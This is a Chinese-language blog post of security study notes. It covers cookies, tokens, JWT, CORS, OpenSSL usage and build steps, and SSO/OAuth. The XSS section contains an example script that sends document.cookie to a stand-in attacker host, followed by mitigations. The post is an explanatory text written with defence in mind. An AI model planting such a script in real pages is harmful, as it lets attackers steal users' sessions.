---
title: "信息安全专栏"
date: 2023-10-26T16:17:36+08:00
categories:
- 计算机科学与技术
- 信息安全
tags:
- 信息安全
- 施工中
thumbnailImagePosition: left
thumbnailImage: /images/thumbnail/security.jpg
---
本文记录所有的信息安全中的加解密知识，库，实用工具。也包括鉴权、访问控制、抗抵赖相关知识。
<!--more-->
## 基础假设
1. 从系统角度来说，任何应用都是不安全的，不应被信任的，因此不应给予超过必需部分的权限和数据。
2. 任何用户操作都是不安全的，不应被信任的，对输入要进行专门的检查。

## 基础术语
1. Web
    1. Cookie：用于在客户端存储一些用户信息的**小型文本文件**。一般用于实现Session会话，是Http协议应对无状态问题的一种解决方式。
        - 分类：
            - 第一方和第三方Cookie：第一方就是当前站点页面A的域名的Cookie，第三方是当前站点页面A内的第三方页面内容B（比如一个植入广告）专用的Cookie。可以用于分析页面之间的关系，比如记录用户广告点击来源，分析行为。
            - 会话Cookie、持久Cookie、安全Cookie、HttpOnly Cookie
        - 由服务器端实现会话时，服务器端相当于成为了有状态的服务。在设计上并不好，需要考虑容灾问题。
    2. Token：经过加密处理的**一段数据**。可存储在客户端浏览器缓存、localStorage、sessionStorage。服务器上存储在数据库中。移动端设备支持更好，支持跨程序调用。安全性、可扩展性、跨域支持能力都更强，更灵活。
        - 和Cookie存在多方面差异：安全性、可扩展性、跨域支持、对服务器压力、时效性。但和Cookie并不是并列关系，Token也可以存储在Cookie中。
        - Token完全由应用管理，设计上能支持服务器的无状态服务，即在Token中保存所有必须的用户数据。
        - 分类：Access Token（标识用户身份的令牌）、Refresh Token（用于刷新用户身份标识的专用令牌）
        - 实现方式：JWT（头部.负载.签名）描述了必须的元数据/数据字段/数字签名
        - 参考：[傻傻分不清之 Cookie、Session、Token、JWT](https://juejin.cn/post/6844904034181070861)、[JSON Web Token 入门教程](https://www.ruanyifeng.com/blog/2018/07/json_web_token-tutorial.html)
    3. User-Agent：浏览器等客户端向Http请求头中添加的字段，用于填写客户端的系统和软件信息。
    4. 跨域：一种和鉴权相关的安全策略问题。出现在浏览器语境下，是浏览器为了用户的安全性做出的策略。其目的在于通过控制跨域请求，来避免CRSF（跨站请求伪造）和XSS（跨站脚本攻击）
        - 网页发起跨域请求，需要前端（浏览器）和后端同时支持
        - 原理：
            - 简单请求：HEAD/GET/POST且请求头信息不超过允许的字段。浏览器会在请求头中自动添加Origin字段，并填充当前域名A。服务器接收到之后决定该域名A是否允许发起该跨域请求。并填充```Allow-Control-Allow-Origin```、```Allow-Control-Allow-Credentials```、```Access-Control-Expose-Headers```等字段。
            - 非简单请求：所有的其他请求，都会先发送预检请求OPTIONS，主要是询问服务器是否支持指定的请求方法和额外的请求头字段，即```Access-Control-Request-Method/Headers```。只有服务器允许，浏览器才会发送正式请求。
        > 从原理可以看出，CORS配置对后端有一定要求，如果对Origin的检查、以及各Allow字段配置不正确，都会造成CORS漏洞。
        - XHR请求是否携带Cookies在不同浏览器上不明确，最好手动设置
        - 参考：[网页攻击 和 跨域 的相关问题梳理](https://blog.csdn.net/s18813688772/article/details/121910084)、[CORS攻击原理介绍和使用](https://cloud.tencent.com/developer/article/1728658)

## 常见攻击手段 
1. Web
    1. XSS：跨站脚本攻击。最常见的方式是在一个用户可创作内容的网站中，插入一段可执行代码，完成指定动作。
        ```html
        <script>
            // new Image().src = "http://stole.you.cookie.com/save?c=" + encodeURI(document.cookie);
        </script>
        ```
        - 应对方式：
            - 对于Cookie的窃取，可以通过在Set-Cookie头中设置HttpOnly标识，禁止页面脚本获取Cookie。但这只是最基本的，实际上仍有HttpOnly绕过手段。
            - 检查用户输入，禁止其中的脚本执行
    2. 

## OpenSSL
- 注意点
    1. OpenSSL的风格是，内部结构**不导出**，因此对于```ECDSA_SIG```、```BIGNUM```等，不能直接通过成员访问操作符```->```来获取成员。正确的方式是使用相对应的API。例如
        ```c
            // 对ASN.1的DER编码进行解码
        	ECDSA_SIG* result = d2i_ECDSA_SIG(&sig, (const unsigned char**)&derData, derlen);
            // BIGNUM也是用BN_new获取
            const BIGNUM* pr = BN_new();
            const BIGNUM* ps = BN_new();
            // 对result->r和result->s的获取
            ECDSA_SIG_get0(result, &pr, &ps);
        ```
- Windows下的编译：
    - 步骤：
        1. 安装Perl
        2. ```mkdir your-build ; cd your-build```
        3. ```perl Configure VC-WIN64A no-asm --prefix=D:\path\to\install```，生成makefile等，更多[配置说明](https://wiki.openssl.org/index.php/Compilation_and_Installation)
        4. 调用Visual Studio的Native Tools Command Prompt，执行```nmake```
        5. ```nmake install```
    - 参考：[win10 x64 visual studio 2019 编译 OpenSSL-1.1.1](https://blog.csdn.net/qiuxue110/article/details/115560240)

## 鉴权
1. 单点登录SSO（Single Sign On）：在一个多应用系统中，提供一处登录处处登录，一处登出处处登出的效果。参考[单点登录解决方案](https://cloud.tencent.com/developer/article/1636664)。
    1. Cookie：
        - 不跨域：将多个应用的Session进行共享，并将其SessionId放到Cookie中交给客户端。可以实现不跨域（不跨顶级域）前提下的单点登录。
        - 跨域：通过引入CAS（Central Authentication Service）服务器，提供SSO会话。在访问应用时，会重定向到SSO会话服务，登录并提供SSO会话的Cookie，和为应用提供的Service Ticket。应用会去CAS服务器查验Service Ticket是否有效。
    2. OAuth：一种认证授权机制，通过在服务端和客户端之间增加一个授权层，来向第三方颁发令牌。它主要是为了用来提供不同系统之间API的授权服务（A应用想调用B应用的API接口）。当然也可以用于单点登录。参考[理解OAuth 2.0](https://www.ruanyifeng.com/blog/2014/05/oauth_2_0.html)
        - 术语：第三方应用程序（企图获得API授权的程序）、服务提供商（API提供者）、资源所有者（用户）、用户代理（浏览器）、认证服务器（API提供者用于执行OAuth）、资源服务器（API提供者内部）
        - 流程：第三方应用程序访问授权层，在资源所有者控制下授权令牌（可指定范围和有效期），服务提供商根据令牌想第三方应用程序提供服务。
        - 模式：授权码模式（第三方服务器-服务提供商服务器）、简化模式（用户代理-服务器提供商服务器）、密码模式（直接给第三方密码）、客户端模式（第三方把自己视作用户）
    3. JWT（JSON Web Token）：JWT本身只是一种Token的实现方式，但同时这种方式能够很好的支持单点登录。用户在登录之后，会获取到认证服务生成的JWT，每次访问均携带JWT，由网关等对JWT进行核验。由于JWT本身并不一定加密（只是一定会做签名），所以需要搭配https，总之应当尽量保证JWT不被泄露。